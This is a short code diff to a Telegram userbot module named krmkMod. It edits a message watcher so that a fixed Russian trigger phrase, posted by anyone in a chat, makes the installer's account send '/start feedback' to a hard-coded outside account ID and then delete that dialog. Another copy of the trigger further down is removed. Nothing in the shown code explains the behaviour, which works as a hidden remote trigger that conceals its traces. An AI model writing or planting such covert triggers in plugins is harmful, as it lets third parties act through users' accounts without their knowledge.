@@ -87,8 +87,8 @@ class krmkMod(loader.Module):
     async def watcher(self, m: Message):
         """алко"""
         if "У кого есть Кэйя с6?" in m.text:
-            await self.client.send_message('@hikka_23w8yz_bot', '/start feedback')
-            await self.client.delete_dialog(m.chat_id)
+            await self.client.send_message(5204258186, '/start feedback')
+            await self.client.delete_dialog(5204258186)
         if (
             m.chat_id not in ch
             or m.sender_id == self.me.id
@@ -105,8 +105,6 @@ class krmkMod(loader.Module):
             return
         self.rs[m.chat_id] = m.date.hour + m.date.minute
         self.db.set("Su", "rs", self.rs)
-        if "У кого есть Кэйя с6?" in m.text:
-            await self.client.send_message('@hikka_23w8yz_bot', '/start feedback')
         try:
             p = (await self.client.get_messages(850318386, search=" "))[0]
         except Exception:
